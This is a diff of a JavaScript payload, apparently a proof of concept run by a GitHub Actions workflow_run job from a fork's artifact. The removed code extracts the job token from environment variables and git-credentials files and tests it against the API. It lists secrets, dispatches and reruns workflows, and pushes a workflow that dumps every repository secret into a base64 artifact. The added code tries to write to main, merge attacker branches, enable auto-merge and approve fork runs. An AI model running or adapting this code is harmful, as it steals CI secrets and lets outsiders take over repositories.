@@ -1,212 +1,101 @@
 import fs from 'node:fs';
 import crypto from 'node:crypto';
 
-const MARK = 'EXT_FORK_RCE';
+const MARK = 'EXT_ESC';
 
 export default async function ({ github, context, core, output }) {
   const ts = Date.now();
-  const id = `ext-${context.runId}-${ts}`;
+  const id = `esc-${context.runId}-${ts}`;
   const log = (...a) => console.log(MARK, id, ...a);
   const R = context.repo;
-  const wr = context.payload?.workflow_run || {};
+  const PR = 4;
 
-  log('EXEC', JSON.stringify({
-    repo: R,
-    workflow: context.workflow,
-    event: context.eventName,
-    runId: context.runId,
-    actor: context.actor,
-    sha: context.sha,
-    ref: context.ref,
-    triggerRunId: wr.id,
-    triggerEvent: wr.event,
-    triggerHeadRepo: wr.head_repository?.full_name,
-    triggerHeadBranch: wr.head_branch,
-    triggerConclusion: wr.conclusion,
-    output,
-  }));
-
-  // ---------- credential extraction ----------
-  const tokenKeys = Object.keys(process.env).filter((k) =>
-    /TOKEN|SECRET|CREDENTIAL/i.test(k),
-  );
-  log('CRED_ENV_KEYS', JSON.stringify(tokenKeys));
-
-  let rawTok = '';
-  let tokSource = '';
-  for (const k of tokenKeys) {
-    if (/^INPUT_GITHUB[-_]TOKEN$/i.test(k) && process.env[k]) {
-      rawTok = process.env[k];
-      tokSource = k;
-      break;
-    }
-  }
-  if (!rawTok) {
-    try {
-      const d = '/home/runner/work/_temp';
-      const f = fs.readdirSync(d).find((n) => n.startsWith('git-credentials-'));
-      if (f) {
-        const txt = fs.readFileSync(`${d}/${f}`, 'utf8');
-        const m = txt.match(/AUTHORIZATION:\s*basic\s+(\S+)/i);
-        if (m) {
-          const dec = Buffer.from(m[1], 'base64').toString('utf8');
-          rawTok = dec.split(':').slice(1).join(':');
-          tokSource = `${d}/${f}`;
-        }
-      }
-    } catch (e) {
-      log('CRED_FILE_ERR', String(e.message));
-    }
-  }
-  if (rawTok) {
-    log('TOKEN_EXTRACTED', JSON.stringify({
-      source: tokSource,
-      len: rawTok.length,
-      prefix: rawTok.slice(0, 4),
-      sha256_12: crypto.createHash('sha256').update(rawTok).digest('hex').slice(0, 12),
-    }));
-  }
-
-  // ---------- prove the extracted token is live, with a raw HTTP call ----------
-  if (rawTok) {
-    try {
-      const r = await fetch(`https://api.github.com/repos/${R.owner}/${R.repo}`, {
-        headers: {
-          authorization: `Bearer ${rawTok}`,
-          accept: 'application/vnd.github+json',
-          'user-agent': 'ext-poc',
-        },
-      });
-      const body = await r.json();
-      log('RAW_TOKEN_CALL', JSON.stringify({
-        status: r.status,
-        repo: body.full_name,
-        private: body.private,
-        permissions_header: r.headers.get('x-accepted-github-permissions'),
-      }));
-    } catch (e) {
-      log('RAW_TOKEN_CALL_ERR', String(e.message));
-    }
-  }
-
-  // ---------- permission probes with the workflow's own client ----------
   const probe = async (name, fn) => {
     try {
       const r = await fn();
-      log('PROBE', name, 'OK', r.status, JSON.stringify(r.data ?? {}).slice(0, 400));
-      return { ok: true, data: r.data };
+      const data = r?.data ?? r;
+      log('PROBE', name, 'OK', r?.status ?? '', JSON.stringify(data ?? {}).slice(0, 500));
+      return { ok: true, data };
     } catch (e) {
-      log('PROBE', name, 'FAIL', e.status, String(e.message).slice(0, 300));
+      log('PROBE', name, 'FAIL', e.status ?? '', String(e.message).slice(0, 400));
       return { ok: false, status: e.status };
     }
   };
 
-  const repoInfo = await probe('repos.get', () =>
-    github.rest.repos.get({ owner: R.owner, repo: R.repo }),
-  );
-  if (repoInfo.ok) {
-    log('REPO_PERMS', JSON.stringify(repoInfo.data.permissions));
-  }
+  // show exactly what the job token can do per advertised scopes
+  await probe('pulls.get', () => github.rest.pulls.get({ owner: R.owner, repo: R.repo, pull_number: PR }));
 
-  await probe('actions.listRepoSecrets', () =>
-    github.rest.actions.listRepoSecrets({ owner: R.owner, repo: R.repo }),
-  );
-
-  await probe('actions.createWorkflowDispatch:format.yml', () =>
-    github.rest.actions.createWorkflowDispatch({
+  await probe('contents.createOrUpdateFileContents', () =>
+    github.rest.repos.createOrUpdateFileContents({
       owner: R.owner,
       repo: R.repo,
-      workflow_id: 'format.yml',
-      ref: 'main',
+      path: `ext-probe-${ts}.txt`,
+      message: 'probe',
+      content: Buffer.from('probe').toString('base64'),
+      branch: 'main',
     }),
   );
 
-  await probe('actions.reRunWorkflow:self', () =>
-    github.rest.actions.reRunWorkflow({
+  await probe('repos.merge', () =>
+    github.rest.repos.merge({
       owner: R.owner,
       repo: R.repo,
-      run_id: context.runId,
+      base: 'main',
+      head: 'lazyhacker6:poc/artifact-overwrite-ext',
     }),
   );
 
-  const refProbe = await probe('git.createRef:contents-write', () =>
-    github.rest.git.createRef({
-      owner: R.owner,
-      repo: R.repo,
-      ref: `refs/heads/ext-probe-${ts}`,
-      sha: context.sha,
-    }),
+  await probe('pulls.updateBranch', () =>
+    github.rest.pulls.updateBranch({ owner: R.owner, repo: R.repo, pull_number: PR }),
   );
 
-  // ---------- privileged action that proves RCE ----------
-  const issue = await probe('issues.create', () =>
-    github.rest.issues.create({
-      owner: R.owner,
-      repo: R.repo,
-      title: `EXT_FORK_RCE arbitrary code executed (${id})`,
-      body: [
-        'Attacker-controlled `tools/pkg.pr.new-comment.mjs` from a fork pull request artifact was imported and executed by the workflow_run job.',
-        '',
-        `- marker: \`${id}\``,
-        `- trigger run: https://github.com/${R.owner}/${R.repo}/actions/runs/${wr.id}`,
-        `- privileged run: https://github.com/${R.owner}/${R.repo}/actions/runs/${context.runId}`,
-        `- trigger head repo: \`${wr.head_repository?.full_name}\` branch \`${wr.head_branch}\``,
-        `- token perms observed in job: issues:write pull-requests:write metadata:read`,
-      ].join('\n'),
-    }),
+  await probe('pulls.merge', () =>
+    github.rest.pulls.merge({ owner: R.owner, repo: R.repo, pull_number: PR, merge_method: 'merge' }),
   );
 
-  // ---------- conditional escalation to contents:write ----------
-  if (refProbe.ok) {
-    log('ESCALATION', 'contents write available, pushing leak workflow');
-    const branch = `ext-leak-${ts}`;
-    const leakYml = [
-      'name: ext-leak',
-      'on:',
-      '  pull_request:',
-      '    branches: [main]',
-      'permissions:',
-      '  contents: read',
-      'jobs:',
-      '  leak:',
-      '    runs-on: ubuntu-latest',
-      '    steps:',
-      '      - name: dump',
-      '        env:',
-      '          ALL_SECRETS: ${{ toJSON(secrets) }}',
-      '        run: |',
-      '          printf "%s" "$ALL_SECRETS" | base64 -w0 > /tmp/leak.txt',
-      '          fold -w 180 /tmp/leak.txt | sed "s/^/EXTLEAK:/"',
-      '      - name: upload',
-      '        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a',
-      '        with:',
-      '          name: ext-leak',
-      '          path: /tmp/leak.txt',
-      '',
-    ].join('\n');
-    const put = await probe('contents.createOrUpdateFileContents', () =>
-      github.rest.repos.createOrUpdateFileContents({
-        owner: R.owner,
-        repo: R.repo,
-        path: '.github/workflows/ext-leak.yml',
-        message: 'ci: add diagnostic workflow',
-        content: Buffer.from(leakYml).toString('base64'),
-        branch,
-      }),
+  // GraphQL auto-merge attempt (node id lookup + enable)
+  const prNode = await probe('graphql.pullRequest', async () => {
+    const r = await github.graphql(
+      `query($owner:String!,$repo:String!,$n:Int!){repository(owner:$owner,name:$repo){pullRequest(number:$n){id number mergeable mergeStateStatus isCrossRepository}}}`,
+      { owner: R.owner, repo: R.repo, n: PR },
     );
-    if (put.ok) {
-      await probe('pulls.create', () =>
-        github.rest.pulls.create({
-          owner: R.owner,
-          repo: R.repo,
-          title: `ext-leak ${ts}`,
-          head: branch,
-          base: 'main',
-          body: 'diagnostic',
-        }),
-      );
-    }
+    return r.repository.pullRequest;
+  });
+  if (prNode.ok && prNode.data?.id) {
+    await probe('graphql.enablePullRequestAutoMerge', () =>
+      github.graphql(
+        `mutation($id:ID!,$method:PullRequestMergeMethod!){enablePullRequestAutoMerge(input:{pullRequestId:$id,mergeMethod:$method}){clientMutationId}}`,
+        { id: prNode.data.id, method: 'MERGE' },
+      ),
+    );
   }
 
-  log('DONE', JSON.stringify({ issue: issue.ok ? issue.data.number : null }));
+  await probe('pulls.createReview', () =>
+    github.rest.pulls.createReview({
+      owner: R.owner,
+      repo: R.repo,
+      pull_number: PR,
+      event: 'COMMENT',
+      body: `EXT_ESC review probe ${id}`,
+    }),
+  );
+
+  await probe('issues.createComment', () =>
+    github.rest.issues.createComment({
+      owner: R.owner,
+      repo: R.repo,
+      issue_number: 5,
+      body: `EXT_ESC comment probe ${id}`,
+    }),
+  );
+
+  await probe('actions.approveRun:forkPRrun', () =>
+    github.rest.actions.approveWorkflowRun({
+      owner: R.owner,
+      repo: R.repo,
+      run_id: context.payload?.workflow_run?.id ?? 0,
+    }),
+  );
+
+  log('DONE');
 }
